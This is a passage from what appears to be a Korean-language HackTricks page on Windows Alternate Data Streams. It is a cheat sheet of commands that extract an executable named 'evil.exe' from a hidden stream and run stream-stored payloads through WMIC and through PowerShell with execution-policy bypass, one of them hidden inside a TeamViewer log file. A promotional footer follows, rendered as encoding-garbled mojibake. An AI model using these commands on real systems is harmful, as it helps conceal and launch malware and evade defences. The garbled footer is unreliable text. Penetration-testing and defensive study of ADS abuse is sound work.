# Use Sysinternals tool to list ADS of a file
streams.exe <c:\path\to\file>

### Extracting Content from ADS ###
# Extract an executable stored in an ADS
expand c:\ads\file.txt:test.exe c:\temp\evil.exe

### Executing ADS Content ###
# Execute an executable stored in an ADS using WMIC
wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'
# Execute a script stored in an ADS using PowerShell
powershell -ep bypass - < c:\temp:ttt
```

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”**? ì•„ë‹ˆë©´ **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•´ë³´ì„¸ìš”. ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter**ì—ì„œ ì €ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš” ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **í•´í‚¹ íŒì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ë°** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ì— ì œì¶œí•˜ì„¸ìš”.**

</details>
